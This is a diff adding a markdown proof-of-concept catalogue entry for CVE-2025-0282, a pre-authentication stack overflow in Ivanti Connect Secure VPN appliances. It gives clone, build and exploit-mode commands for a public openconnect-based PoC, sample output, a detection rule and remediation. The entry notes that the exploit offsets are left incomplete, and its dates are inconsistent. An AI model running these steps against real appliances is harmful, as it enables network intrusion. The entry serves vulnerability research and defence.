@@ -1,0 +1,170 @@
+
+<!-- 
+  File: 2026-05-17_ivanti-connect-secure-rce.md
+  Location: pocs/network/
+-->
+
+---
+
+## Metadata
+
+| Field | Value |
+|---|---|
+| **Date Added** | 2026-05-17 |
+| **Last Updated** | 2025-01-18 |
+| **Author / Researcher** | Sina Kheirkhah (@SinSinology) of watchTowr Labs |
+| **CVE / Advisory** | CVE-2025-0282 |
+| **Category** | network |
+| **Severity** | Critical |
+| **CVSS Score** | 9.0 (CVSSv3) |
+| **Status** | Weaponized |
+| **Tags** | RCE, stack-overflow, buffer-overflow, pre-auth, unauthenticated, VPN, zero-day, active-exploitation, Ivanti, TLS |
+| **Related** | N/A |
+
+---
+
+## Affected Target
+
+| Field | Value |
+|---|---|
+| **Software / System** | Ivanti Connect Secure, Ivanti Policy Secure, Ivanti ZTA Gateways |
+| **Versions Affected** | Ivanti Connect Secure prior to 22.7R2.5; Policy Secure prior to 22.7R1.2; ZTA Gateways prior to 22.8R2.2 |
+| **Language / Platform** | C (openconnect-based PoC); target runs on custom Linux-based appliance |
+| **Authentication Required** | No (pre-authentication) |
+| **Network Access Required** | Yes (TCP port 443, HTTPS/TLS) |
+
+---
+
+## Summary
+
+CVE-2025-0282 is a pre-authentication stack-based buffer overflow in the IFT (IF-T) TLS protocol handling code of Ivanti Connect Secure VPN appliances. Discovered and disclosed by Sina Kheirkhah of watchTowr Labs, this zero-day was confirmed by Mandiant as actively exploited in the wild before vendor notification. An unauthenticated remote attacker can overflow a stack buffer during TLS/IF-T handshake processing, achieving Remote Code Execution on the appliance with no user interaction required. The PoC is a patched fork of the OpenConnect VPN client that implements the exploit in "Normal" (reachability probe) and "Exploit" (overflow trigger) modes.
+
+---
+
+## Vulnerability Details
+
+### Root Cause
+
+A stack-based buffer overflow (CWE-121) exists in the IF-T over TLS stack within the Ivanti Connect Secure IFT daemon. During protocol negotiation, attacker-controlled data is copied into a fixed-size stack buffer without proper bounds checking. The overflow overwrites return addresses or control data on the stack, allowing an attacker to redirect execution flow. The exploit requires hardcoded gadget addresses and offsets specific to the target firmware version.
+
+### Attack Vector
+
+An unauthenticated attacker establishes a TLS connection to port 443 of the Ivanti Connect Secure appliance and initiates an IF-T protocol exchange. By sending a specially crafted oversized message during the handshake phase, the attacker triggers the stack overflow. In exploit mode, the openconnect client sends the malformed payload and the target responds with "Failed to complete authentication" indicating the overflow occurred. The PoC is intentionally incomplete (addresses and offsets are not provided) to require per-target adaptation.
+
+### Impact
+
+Remote Code Execution on the Ivanti Connect Secure appliance as a privileged process. Since these appliances sit at the network perimeter and handle all VPN traffic, successful exploitation grants full network access, credential interception, lateral movement into the internal network, and persistence on the appliance. Mandiant confirmed exploitation in the wild for espionage purposes, with post-exploitation involving deployment of custom malware families.
+
+---
+
+## Environment / Lab Setup
+
+```
+OS:          Linux (Ubuntu 22.04 recommended for compilation)
+Target:      Ivanti Connect Secure appliance (vulnerable firmware, network-accessible port 443)
+Attacker:    Linux host with GCC, make, openssl-dev, libssl-dev
+Tools:       Custom openconnect fork (openconnect-CVE-2025-0282 directory), GCC toolchain
+```
+
+### Setup Steps
+
+```bash
+git clone https://github.com/watchtowrlabs/CVE-2025-0282
+cd CVE-2025-0282/openconnect-CVE-2025-0282
+
+./configure && make
+
+MODE=normal ./openconnect --protocol=pulse --user=test <TARGET_IP>
+
+MODE=exploit ./openconnect --protocol=pulse --user=test <TARGET_IP>
+```
+
+---
+
+## Proof of Concept
+
+### Step-by-Step Reproduction
+
+1. **Normal mode probe** - Verify the target is reachable and the IF-T stack is functional.
+   ```bash
+   MODE=normal ./openconnect-CVE-2025-0282/openconnect --protocol=pulse --user=test <TARGET_IP>
+   # Success indicator: "Enter user credentials: Password:" prompt appears
+   ```
+
+2. **Exploit mode trigger** - Send the overflow payload.
+   ```bash
+   MODE=exploit ./openconnect-CVE-2025-0282/openconnect --protocol=pulse --user=test <TARGET_IP>
+   # Vulnerability indicator: "Failed to complete authentication" + "[!] Target might be vulnerable"
+   ```
+
+3. **Adapt offsets** - The PoC ships with intentionally incomplete/broken hardcoded gadget addresses. Consult the watchTowr technical write-up to understand the technique and adapt offsets for the specific target firmware version.
+
+### Exploit Code
+
+> See the `openconnect-CVE-2025-0282/` directory for the patched C source. The PoC is a modified openconnect client.
+
+```bash
+MODE=exploit ./openconnect --protocol=pulse --user=test 10.20.5.4
+```
+
+### Expected Output
+
+```
+(*) Ivanti Connect Secure IFT TLS Stack Overflow pre-auth RCE (CVE-2025-0282)
+  - Sina Kheirkhah (@SinSinology) of watchTowr (sina@watchTowr.com)
+
+Connected to 10.20.5.4:443
+SSL negotiation with 10.20.5.4
+Got HTTP response: HTTP/1.1 101 Switching Protocols
+Failed to read from TLS/DTLS socket: Error in the pull function.
+Failed to complete authentication
+
+ [!] Target might be vulnerable
+```
+
+---
+
+## Screenshots / Evidence
+
+<!-- Add paths to screenshots or embed them -->
+- No screenshots included in source repository.
+
+---
+
+## Detection & Indicators of Compromise
+
+```
+```
+
+**SIEM / IDS Rule (example):**
+```
+alert tcp any any -> $IVANTI_MGMT 443 (msg:"CVE-2025-0282 IFT Stack Overflow Probe"; content:"IF-T/TLS"; dsize:>8192; sid:9002026; rev:1;)
+```
+
+---
+
+## Remediation
+
+| Action | Detail |
+|---|---|
+| **Patch** | Upgrade Ivanti Connect Secure to 22.7R2.5 or later; Policy Secure to 22.7R1.2; ZTA Gateways to 22.8R2.2 |
+| **Workaround** | Run Ivanti's Integrity Checking Tool (ICT) to detect compromise; consider factory reset if compromise is suspected |
+| **Config Hardening** | Restrict management and VPN port access to known IP ranges; enable enhanced logging; monitor for unexpected outbound connections |
+
+---
+
+## References
+
+- [CVE-2025-0282](https://nvd.nist.gov/vuln/detail/CVE-2025-0282)
+- [watchTowr Technical Write-up - Exploitation Walkthrough and Techniques](https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/)
+- [Ivanti Security Advisory](https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-Policy-Secure-ZTA-Gateways-CVE-2025-0282-CVE-2025-0283)
+- [Mandiant Threat Intelligence Report](https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day)
+- [Source Repository](https://github.com/watchtowrlabs/CVE-2025-0282)
+- [OpenConnect Project](https://www.infradead.org/openconnect/)
+
+---
+
+## Notes
+
+The published PoC is intentionally broken in non-trivial ways and requires effort to adapt to a working exploit against a specific target - the hardcoded memory addresses and ROP gadget offsets need to be derived per firmware version. The watchTowr technical blog post provides the exploitation technique without the complete working payload. Mandiant confirmed exploitation in the wild, attributing activity to a suspected China-nexus espionage actor. This is a zero-day that was exploited before the vendor patch was available. Auto-ingested from https://github.com/watchtowrlabs/CVE-2025-0282 on 2026-05-17.
+
